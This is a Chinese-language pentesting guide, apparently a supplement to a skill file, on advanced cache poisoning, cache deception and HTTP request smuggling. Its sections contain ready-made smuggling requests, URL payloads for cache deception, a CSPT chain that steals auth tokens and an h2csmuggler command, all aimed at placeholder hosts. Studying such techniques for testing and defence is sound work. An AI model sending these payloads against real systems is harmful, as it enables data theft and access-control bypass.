# 缓存投毒/走私高级技术

SKILL.md 覆盖了 CL.TE/TE.CL 基础检测和缓存键概念，本文档聚焦高级技术：缓存欺骗与投毒的区分、URL 差异利用、HTTP/2 降级走私、h2c 走私、响应队列 Desync 和浏览器侧走私。

---

## 一、识别：缓存投毒 vs 缓存欺骗

两种攻击目标完全不同，识别阶段需先判断属于哪一类。

```
缓存攻击类型判断
├─ 目标：让所有用户收到恶意内容？
│  └─ 是 → 缓存投毒 (Cache Poisoning)
│     └─ 核心：找到 unkeyed input，注入恶意内容到被缓存的响应
├─ 目标：窃取特定用户的敏感数据？
│  └─ 是 → 缓存欺骗 (Cache Deception)
│     └─ 核心：诱骗缓存存储受害者的动态响应，攻击者随后读取
└─ 两者可组合：走私请求 + 缓存投毒/欺骗 = 跨用户攻击
```

### 缓存欺骗典型手法

利用路径后缀让缓存误认为是静态资源（缓存看 `.js` 扩展名，Web 服务器忽略多余路径返回动态内容）：

```
/profile.php/nonexistent.js    /profile.php/.css
/profile.php/../test.js        /profile.php/%2e%2e/test.js
/profile.php/x.avif
```

### CSPT 辅助的缓存欺骗（账户接管链）

当 SPA 存在客户端路径遍历 (CSPT) 且 CDN 按扩展名缓存时：

```
受害者访问 → /user?userId=../../../v1/token.css
SPA 认证请求 → GET /v1/users/info/../../../v1/token.css
浏览器规范化 → GET /v1/token.css（携带 X-Auth-Token）
CDN 缓存 .css → 响应含受害者 token JSON
攻击者访问 /v1/token.css → 获取缓存的 token
```

验证：对敏感 API 追加 `.css`/`.js`/`.json` 后缀，检查 `X-Cache: Hit` 且缓存键不含认证头。

---

## 二、判断：URL 差异投毒 (URL Discrepancy)

当缓存服务器和 Web 服务器对 URL 的解析不一致时，可利用差异让缓存存储非预期内容。

### 分隔符差异

不同框架对 URL 分隔符的处理不同：

| 分隔符 | 框架行为 | 示例 |
|--------|---------|------|
| `;` (分号) | Spring 视为 matrix 参数 | `/hello;var=a/world` → `/hello/world` |
| `.` (点) | Rails 视为格式后缀 | `/MyAccount.css` → `/MyAccount` |
| `%00` (空字节) | OpenLiteSpeed 截断路径 | `/MyAccount%00aaa` → `/MyAccount` |
| `%0a` (换行) | Nginx 分割 URL | `/users/MyAccount%0aaaa` → `/account/MyAccount` |

### 分隔符探测

在动态页面路径后追加分隔符候选 + 随机字符串，如果响应与原始页面一致 → 该字符是有效分隔符。

### 编码差异

CDN 和源站对 URL 编码的解码行为不同：

```http
GET /myAccount%3Fparam HTTP/1.1
Host: target.com
```

- Web 服务器解码为 `/myAccount?param` → 返回 `/myAccount` 的内容
- 缓存服务器保留 `/myAccount%3Fparam` 作为缓存键

### 点段 (Dot Segment) 规范化差异

```http
GET /static/../home/index HTTP/1.1
```

- 某些缓存将原始路径 `/static/../home/index` 作为键
- 源站规范化为 `/home/index` 并返回对应内容
- 结果：动态内容被缓存在 static 路径下

### 静态资源缓存规则利用

```
缓存触发条件判断
├─ 按扩展名：CDN 自动缓存 .js/.css/.png/.jpg 等
│  └─ 利用：/home$image.png → 缓存键包含 image.png，源站响应 /home
├─ 按目录：/static/ /assets/ /wp-content/ /media/ /public/
│  └─ 利用：/home/..%2fstatic/something → 缓存 /static/something，响应 /home
└─ 按文件名：/robots.txt /favicon.ico /index.html
   └─ 利用：/home/..%2Frobots.txt → 缓存 /robots.txt，响应 /home
```

---

## 三、判断：HTTP/2 降级走私

HTTP/2 的帧长度机制本身免疫传统走私，但当前端代理将 HTTP/2 降级为 HTTP/1.1 转发到后端时，保护消失。

### 降级检测

```bash
# 检查前端是否支持 HTTP/2
curl -v --http2 https://target 2>&1 | grep "Using HTTP2"
# 通过 HTTP/2 发送畸形 CL/TE，收到 HTTP/1.1 错误（如 "400 Bad chunk"）→ 存在降级
```

### H2.TE 和 H2.CL 两类原语

| 变体 | 前端判断长度 | 后端判断长度 | 攻击思路 |
|------|-------------|-------------|---------|
| H2.TE | HTTP/2 帧长度 | Transfer-Encoding: chunked | 嵌入额外 chunked body，后端等待未发送的终止 chunk |
| H2.CL | HTTP/2 帧长度 | Content-Length | 发送小于实际 body 的 CL，后端越界读取 |

### H2.TE 利用流程

```http
:method: POST
:path: /login
:scheme: https
:authority: example.com
content-length: 13
transfer-encoding: chunked

5;ext=1\r\nHELLO\r\n
0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\nX: X
```

解析过程：
1. 前端按 HTTP/2 帧转发全部数据
2. 后端按 chunked 解析，遇到 `0\r\n\r\n` 后认为第一个请求结束
3. 剩余的 `GET /admin ...` 被当作下一个独立请求

---

## 四、判断：h2c 走私 (Upgrade Header Smuggling)

h2c 走私利用反向代理对 `Upgrade` 头的不当处理，建立绕过安全控制的隧道。升级完成后代理进入 passthrough 模式，不再管理单个请求。

### 关键请求头

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

### 代理脆弱性分类

```
天然转发 Upgrade + Connection（默认可利用）
├─ HAProxy
├─ Traefik
└─ Nuster

可能通过错误配置转发（需测试）
├─ AWS ALB/CLB
├─ Nginx
├─ Apache
├─ Squid
├─ Varnish
├─ Kong
├─ Envoy
└─ Apache Traffic Server
```

### 利用工具

```bash
# BishopFox h2csmuggler
python3 h2csmuggler.py -u https://target -x 'GET /admin HTTP/1.1\r\nHost: target\r\n\r\n'
```

关键点：升级后连接可到达后端任意路径，不受 `proxy_pass` 配置的路径限制。

---

## 五、利用：响应队列 Desync

与传统请求走私不同，响应 Desync 目标是控制或窃取受害者收到的响应（发 2 个完整请求错位代理的响应队列，而非 1.5 个请求篡改下一用户请求开头）。

### 攻击流程

```
攻击者发送：初始请求 + 走私请求（需要较长处理时间）
走私请求在后端排队处理期间，受害者的请求到达 →
├─ 受害者收到走私请求的响应（攻击者控制的内容）
└─ 攻击者的后续请求收到受害者的响应（窃取数据）
```

### HEAD 方法增强 Desync

HEAD 响应包含 `Content-Length` 但无 body，代理等待后续数据填充 → 用下一个响应内容填充 → 受害者收到攻击者控制的响应。

利用场景：
- **内容混淆**：HEAD 的 `Content-Type: text/html` + 注入 body → XSS
- **缓存投毒**：代理缓存错位响应 → 所有后续用户受影响
- **响应分割**：精确计算 Content-Length → 完全控制下一个响应

---

## 六、利用：高级走私变体

### CL.0 / TE.0

后端忽略 Content-Length（视为 0）或 Transfer-Encoding，但前端正常解析：

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 16
Connection: keep-alive

GET /admin HTTP/1.1
```

CL.0：前端按 CL 转发 16 字节，后端忽略 CL 只处理请求行。

### Premature Upgrade Passthrough

代理在后端确认 `101` 之前就切换到 passthrough 模式，后续字节作为原始数据转发：

```http
GET / HTTP/1.1
Host: target.com
Upgrade: anything
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
```

代理只解析第一个请求，后续字节作为原始数据转发。

### TE 规范化缺陷 + HTTP/1.0 close-delimited 回退

代理检测到 TE → 去掉 CL → 但未正确解析 TE 值 → 无有效 framing → 回退到 close-delimited body → 后端正确理解 chunked，`0\r\n\r\n` 之后的字节 = 新请求。

触发方式：

```http
GET / HTTP/1.0
Host: target.com
Connection: keep-alive
Transfer-Encoding: identity, chunked
Content-Length: 29

0

GET /admin HTTP/1.1
X:
```

### Hop-by-Hop 头部滥用

利用 `Connection` 头让代理删除关键头部：

```http
GET / HTTP/1.1
Host: target.com
Connection: Content-Length
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X:
```

代理删除 `Content-Length`（因为 Connection 头声明它是 hop-by-hop），后端只看到 `Transfer-Encoding`。

---

## 七、缓存投毒 DoS 技术

当无法注入 XSS 时，投毒缓存为错误响应实现 DoS：

| 技术 | 原理 |
|------|------|
| Header Oversize (HHO) | 超出 Web 服务器头大小限制但不超缓存限制 |
| Meta Character (HMC) | 注入 `\n` `\r` 等控制字符触发 400 |
| Method Override (HMO) | `X-HTTP-Method-Override: POST` 改变方法触发错误 |
| Unkeyed Port | `Host: target.com:1` 端口不入缓存键但影响重定向 |
| Fat GET | GET 带 body 触发 403 |
| Host 大小写 | `Host: Cdn.TARGET.com` 大小写敏感服务器返回 404 |
| 路径编码 | `GET /api/v1%2e1/user` 编码路径触发 404 但缓存不解码 |

---

## 八、验证：管线 (Pipelining) vs 真走私

### 误报判断流程

```
走私行为确认
├─ 关闭连接复用后重测
│  ├─ 行为消失 → 大概率是客户端管线伪影
│  └─ 行为持续 → 继续验证
├─ HTTP/2 嵌套响应检查
│  └─ 响应 body 中包含完整 HTTP/1 响应 → 确认后端 desync
├─ 连接状态探测
│  └─ 同一 TCP 连接上首次 vs 后续请求行为差异
└─ 影响验证
   ├─ 缓存投毒：投毒后用新 IP/新会话验证
   ├─ 内部头泄露：反射出代理注入的认证头
   └─ 前端控制绕过：访问受限路径/方法
```

### Burp Suite 验证设置

```
关闭：Update Content-Length
关闭：Normalize HTTP/1 line endings

Turbo Intruder：requestsPerConnection=1, pipeline=False
排除管线干扰后重新测试
```

### 工具列表

| 工具 | 用途 |
|------|------|
| Burp HTTP Request Smuggler | 自动检测 H2.TE/H2.CL/CL.TE/TE.CL |
| h2cSmuggler (BishopFox) | h2c 升级走私自动化 |
| smugglefuzz | HTTP 走私模糊测试 |
| t-reqs-http-fuzzer | 基于语法的 HTTP 解析差异发现 |
| toxicache | 批量 URL 缓存投毒扫描 |
| wcvs | Web 缓存投毒漏洞扫描 |
| CacheDecepHound | 缓存欺骗检测 |

---

## 九、决策树：完整攻击面评估

```
目标使用 CDN/反向代理/缓存层？
├─ 是
│  ├─ 测试缓存行为
│  │  ├─ 找到 unkeyed input → 缓存投毒（XSS/重定向/DoS）
│  │  ├─ URL 差异（分隔符/编码/点段） → 缓存欺骗窃取数据
│  │  └─ 扩展名后缀缓存 + CSPT → 认证 token 窃取
│  ├─ 测试前后端解析差异
│  │  ├─ CL vs TE 差异 → 传统走私（见 SKILL.md）
│  │  ├─ HTTP/2 + 降级 → H2.TE / H2.CL
│  │  ├─ Upgrade 头转发 → h2c 走私 / WebSocket 走私
│  │  └─ TE 规范化缺陷 → close-delimited 回退走私
│  └─ 走私成功后扩展影响
│     ├─ 走私 + 缓存投毒 → 存储型 XSS
│     ├─ 走私 + 缓存欺骗 → 窃取用户敏感数据
│     ├─ 响应队列 Desync → 控制/窃取任意用户响应
│     └─ 绕过 WAF/ACL/认证 → 访问内部接口
└─ 否
   └─ 转向其他攻击面
```
